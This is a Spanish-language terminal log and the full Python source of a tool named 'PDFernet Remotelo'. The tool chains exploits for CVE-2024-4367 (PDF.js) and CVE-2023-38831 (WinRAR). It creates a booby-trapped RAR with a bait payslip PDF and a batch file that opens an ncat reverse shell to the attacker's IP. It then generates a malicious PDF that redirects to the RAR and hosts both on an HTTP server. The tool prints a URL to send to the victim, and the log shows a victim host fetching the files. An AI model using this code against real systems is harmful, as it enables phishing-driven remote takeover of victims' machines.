
  ___ ___  ___                 _   ___               _       _     
 | _ \   \| __|__ _ _ _ _  ___| |_| _ \___ _ __  ___| |_ ___| |___ 
 |  _/ |) | _/ -_) '_| ' \/ -_)  _|   / -_) '  \/ _ \  _/ -_) / _ \
 |_| |___/|_|\___|_| |_||_\___|\__|_|_\___|_|_|_\___/\__\___|_\___/
                                                                   
Script: PDFernet Remotelo
----------------------------------
PoC de Ejecución de Acceso remoto por medio de un PDF malicioso y Winrar.
CVE Explotados: CVE-2024-4367 y CVE-2023-38831
----------------------------------
Créditos:
Scripts utilizados: https://github.com/LOURC0D3/CVE-2024-4367-PoC y https://github.com/HDCE-inc/CVE-2023-38831
----------------------------------
Debe aclararse que para que funcione este script el sistema debe tener una versión de Winrar 6.22 y Firefox 126 o inferior.

Ingrese la IP seguido de un espacio y el puerto del equipo atacante (ej. 192.168.0.220 6565): 192.168.0.220 6565
CVE-2023-38831 POC
-------------------------------
Exploit generated successfully as 'PDFernetRemotelo.rar'.
[+] Created malicious PDF file: poc.pdf
[+] Open the file with the vulnerable application to trigger the exploit.

##########################################################
#                                                        #
#    URL para que el usuario acceda:                     #
#    http://192.168.0.220/poc.pdf                                 #
#    Enviar esta URL a la víctima.                       #
#                                                        #
##########################################################

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.0.226 - - [19/Jun/2024 19:08:17] "GET /poc.pdf HTTP/1.1" 200 -
192.168.0.226 - - [19/Jun/2024 19:08:17] "GET /PDFernetRemotelo.rar HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/por/final]
└─$ ls
PDFernet.py  PDFernetRemotelo.py  PDFernetRemotelo.rar  poc.pdf  Remotelo.py  ResumendeSueldo.pdf  script.bat  tmp
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/por/final]
└─$ rm PDFernet.py 
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/por/final]
└─$ rm PDFernetRemotelo.rar 
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/por/final]
└─$ rm poc.pdf 
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/por/final]
└─$ rm Remotelo.py 
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/por/final]
└─$ rm ResumendeSueldo.pdf 
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/por/final]
└─$ rm script.bat 
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/por/final]
└─$ rm -r tmp    
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/por/final]
└─$ ls
PDFernetRemotelo.py
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/por/final]
└─$ cat PDFernetRemotelo.py 
# Main script to create files and execute commands

import os

# Step 1: Display the banner and information
banner = """
 _    _ _____ _____ _   _            _  ___            _____      _       _     
| |  | |_   _|  _  | | | |          | |/ (_)          |  ___|    (_)     | |    
| |  | | | | | | | | |_| | ___  __ _| ' / _ _ __   ___| |__ _ __  _ _ __ | |__  
| |/\| | | | | | | |  _  |/ _ \/ _` |  < | | '_ \ / _ \  __| '_ \| | '_ \| '_ \ 
\  /\  / | | \ \_/ / | | |  __/ (_| | . \| | | | |  __/ |__| | | | | |_) | | | |
 \/  \/  \_/  \___/\_| |_/\___|\__, |_|\_\_|_| |_|\___\____/_| |_|_| .__/|_| |_|
                                 __/ |                               | |        
                                |___/                                |_|        

Script: PDFernet Remotelo
----------------------------------
PoC de Ejecución de Acceso remoto por medio de un PDF malicioso y Winrar.
CVE Explotados: CVE-2024-4367 y CVE-2023-38831
----------------------------------
Créditos:
Scripts utilizados: https://github.com/LOURC0D3/CVE-2024-4367-PoC y https://github.com/HDCE-inc/CVE-2023-38831
----------------------------------
Debe aclararse que para que funcione este script el sistema debe tener una versión de Winrar 6.22 y Firefox 126 o inferior.
"""

print(banner)

# Step 2: Prompt for IP and Port
ip_port = input("Ingrese la IP seguido de un espacio y el puerto del equipo atacante (ej. 192.168.0.220 6565): ")
try:
    ip, port = ip_port.split()
except ValueError:
    print("Error: Debe ingresar una IP y un puerto separados por un espacio.")
    exit(1)

# Define the filenames
bait_file = "ResumendeSueldo.pdf"
script_file = "script.bat"
output_file = "PDFernetRemotelo.rar"

# Create the bait file
with open(bait_file, "w") as f:
    pass

# Create the script.bat file with the correct content
with open(script_file, "w") as bat_script:
    bat_script.write(f"ncat {ip} {port} -e cmd.exe")

# PDFernet.py content
pdf_content = '''#!/usr/bin/env python3

import sys

def generate_payload(payload):
    backslash_char = "\\\\"
    fmt_payload = payload.replace('(', '\\\\(').replace(')', '\\\\)')
    font_matrix = f"/FontMatrix [0.1 0 0 0.1 0 (1{backslash_char});\\n" + f"{fmt_payload}" + "\\n//)]"
    return f"""
%PDF-1.4
%DUMMY
8 0 obj
<<
/PatternType 2
/Shading<<
  /Function<<
    /Domain[0 1]
    /C0[0 0 1]
    /C1[1 0.6 0]
    /N 1
    /FunctionType 2
  >>
  /ShadingType 2
  /Coords[46 400 537 400]
  /Extend[false false]
  /ColorSpace/DeviceRGB
>>
/Type/Pattern
>>
endobj
5 0 obj
<<
/Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341]
/Type/Font
/BaseFont/PAXEKO+SourceSansPro-Bold
/LastChar 102
/Encoding/WinAnsiEncoding
{font_matrix}
/Subtype/Type1
/FirstChar 65
/FontDescriptor 9 0 R
>>
endobj
2 0 obj
<<
/Kids[3 0 R]
/Type/Pages
/Count 1
>>
endobj
9 0 obj
<<
/Type/FontDescriptor
/ItalicAngle 0
/Ascent 751
/FontBBox[-6 -12 579 713]
/FontName/PAXEKO+SourceSansPro-Bold
/StemV 100
/CapHeight 713
/Flags 32
/FontFile3 10 0 R
/Descent -173
/MissingWidth 250
>>
endobj
6 0 obj
<<
/Length 128
>>
stream
47 379 489 230 re S
/Pattern cs
BT
  50 500 Td
  117 TL
  /F1 150 Tf
  /P1 scn
  (AbCdEf) Tj
  /P2 scn
  (AbCdEf) '
ET
endstream
endobj
3 0 obj
<<
/Type/Page
/Resources 4 0 R
/Contents 6 0 R
/Parent 2 0 R
/MediaBox[0 0 595.2756 841.8898]
>>
endobj
10 0 obj
<<
/Length 800
/Subtype/Type2
>>
stream

endstream
endobj
7 0 obj
<<
/PatternType 1
/Matrix[1 0 0 1 50 0]
/Length 58
/TilingType 1
/BBox[0 0 16 16]
/YStep 16
/PaintType 1
/Resources<<
>>
/XStep 16
>>
stream
0.65 g
0 0 16 16 re f
0.15 g
0 0 8 8 re f
8 8 8 8 re f
endstream
endobj
4 0 obj
<<
/Pattern<<
  /P1 7 0 R
  /P2 8 0 R
>>
/Font<<
  /F1 5 0 R
>>
>>
endobj
1 0 obj
<<
/Pages 2 0 R
/Type/Catalog
/OpenAction[3 0 R /Fit]
>>
endobj

xref
0 11
0000000000 65535 f
0000002260 00000 n
0000000522 00000 n
0000000973 00000 n
0000002178 00000 n
0000000266 00000 n
0000000794 00000 n
0000001953 00000 n
0000000015 00000 n
0000000577 00000 n
0000001085 00000 n
trailer
<<
/ID[(DUMMY) (DUMMY)]
/Root 1 0 R
/Size 11
>>
startxref
2333
%%EOF
"""

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {{sys.argv[0]}} <payload>")
        sys.exit(1)
    print("[+] Created malicious PDF file: poc.pdf")
    print("[+] Open the file with the vulnerable application to trigger the exploit.")

    payload = generate_payload(sys.argv[1])
    with open("poc.pdf", "w") as f:
        f.write(payload)

    sys.exit(0)
'''

# Remotelo.py content
remotelo_content = f'''#!/usr/bin/env python3

import shutil
import os

def exploit():
    print("CVE-2023-38831 POC")
    print("-------------------------------")

    bait_file = "{bait_file}"
    script_file = "{script_file}"
    output_file = "{output_file}"

    if not os.path.exists(bait_file):
        print(f"Error: {{bait_file}} does not exist.")
        return
    if not os.path.exists(script_file):
        print(f"Error: {{script_file}} does not exist.")
        return

    if not output_file.endswith(".rar"):
        output_file += ".rar"

    template = "tmp"
    if os.path.exists(template):
        shutil.rmtree(template)
    os.mkdir(template)

    d = os.path.join(template, bait_file + "A")
    os.mkdir(d)
    shutil.copyfile(script_file, os.path.join(d, bait_file + "A.cmd"))
    shutil.copyfile(bait_file, os.path.join(template, bait_file + "B"))

    shutil.make_archive(template, 'zip', template)
    with open(template + ".zip", "rb") as f:
        content = f.read()
        content = content.replace(b"A", b" ")
        content = content.replace(b"B", b" ")
    os.remove(template + ".zip")

    with open(output_file, "wb") as f:
        f.write(content)

    print(f"Exploit generated successfully as '{{output_file}}'.")

if __name__ == "__main__":
    exploit()
'''

# Write the scripts to files
with open("PDFernet.py", "w") as pdf_script:
    pdf_script.write(pdf_content)

with open("Remotelo.py", "w") as remotelo_script:
    remotelo_script.write(remotelo_content)

# Execute the commands
os.system("python3 Remotelo.py")
os.system(f'python3 PDFernet.py "window.location.href = \'http://{ip}/PDFernetRemotelo.rar\';"')

# Print the URL for the attacker in a box
url_message = f"""
##########################################################
#                                                        #
#    URL para que el usuario acceda:                     #
#    http://{ip}/poc.pdf                                 #
#    Enviar esta URL a la víctima.                       #
#                                                        #
##########################################################
"""

print(url_message)


os.system("python3 -m http.server 80")

                                                       
